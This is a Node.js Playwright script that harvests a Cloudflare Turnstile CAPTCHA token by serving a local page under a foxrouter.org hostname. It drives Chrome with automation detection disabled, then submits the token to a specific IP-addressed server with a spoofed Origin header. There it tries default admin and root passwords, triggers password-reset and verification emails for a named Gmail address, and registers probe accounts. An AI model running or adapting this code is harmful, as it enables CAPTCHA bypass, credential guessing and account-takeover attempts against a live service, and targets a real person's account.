const { chromium } = require('playwright-core');
const http = require('http');
const fs = require('fs');
const PAGE = fs.readFileSync('page.html');
const T = process.env.RUNNER_TEMP || '/tmp';
const log = s => { const l = '[' + new Date().toISOString().slice(11,19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/r.log', l + '\n'); } catch (e) {} };

const srv = http.createServer((req, res) => {
  if (req.url === '/favicon.ico') { res.writeHead(204); return res.end(); }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(PAGE);
});

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body, ctype) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: ctype ? { 'Content-Type': ctype, 'Origin': 'https://foxrouter.org' } : { 'Origin': 'https://foxrouter.org' }, body: body });
      const txt = await r.text();
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${txt.slice(0, 600)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  await run('login_admin', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'admin', password: 'admin' }), 'application/json');
  await run('login_root', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'root', password: 'root' }), 'application/json');
  await run('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null, null);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'probe' + Date.now() % 100000, password: 'Probe12345!', email: 'p' + Date.now() % 100000 + '@example.com' }), 'application/json');
  await run('verify_mail', base + '/api/verification?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null, null);
}

(async () => {
  await new Promise(r => srv.listen(80, '127.0.0.1', r));
  log('server up');
  const browser = await chromium.launch({ executablePath: '/usr/bin/google-chrome', headless: false,
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-blink-features=AutomationControlled',
      '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4'] });
  let got = '';
  for (let round = 1; round <= 8 && !got; round++) {
    const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, locale: 'en-US', timezoneId: 'America/New_York' });
    const page = await ctx.newPage();
    page.on('response', async r => {
      const u = r.url();
      if (!/challenge-platform|challenges\.cloudflare/.test(u)) return;
      let b = ''; try { b = (await r.text()).slice(0, 200); } catch (e) { b = '<nb>'; }
      log('RESP ' + r.status() + ' ' + r.request().method() + ' ' + u.slice(0, 120) + ' :: ' + b.replace(/\s+/g, ' ').slice(0, 160));
    });
    page.on('requestfailed', r => log('FAILED ' + r.url().slice(0, 120) + ' ' + (r.failure() || {}).errorText));
    log(`ROUND #${round}`);
    try { await page.goto('http://api.foxrouter.org/?r=' + Date.now(), { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (e) { log('GOTO_ERR'); }
    let tok = '';
    for (let i = 0; i < 45 && !tok; i++) {
      await page.waitForTimeout(1000);
      tok = await page.evaluate(() => { try { return (window.turnstile && window.turnstile.getResponse && window.turnstile.getResponse()) || window.__tok || ''; } catch (e) { return ''; } });
      if (i === 6) { // try clicking inside widget area once
        try { const f = page.frames().find(fr => /challenge-platform/.test(fr.url())); if (f) { await f.click('body', { timeout: 3000 }).catch(() => {}); log('CLICKED iframe'); } } catch (e) {}
      }
    }
    const st = await page.evaluate(() => ({ errs: (window.__errs || []).join('|'), html: (document.getElementById('ts') || {}).innerHTML || '' }));
    log(`ROUND_END tok_len=${tok.length} errs=${st.errs} div=${st.html.replace(/\s+/g, ' ').slice(0, 300)}`);
    try { fs.writeFileSync(T + `/r_${round}.png`, await page.screenshot()); } catch (e) {}
    if (tok) { got = tok; log('TOKEN ' + tok); fs.writeFileSync(T + '/token.txt', tok); await submit(tok, '#' + round); }
    await ctx.close();
  }
  log('DONE got=' + got.length);
  await browser.close(); srv.close(); process.exit(0);
})().catch(e => { log('FATAL ' + e); process.exit(1); });
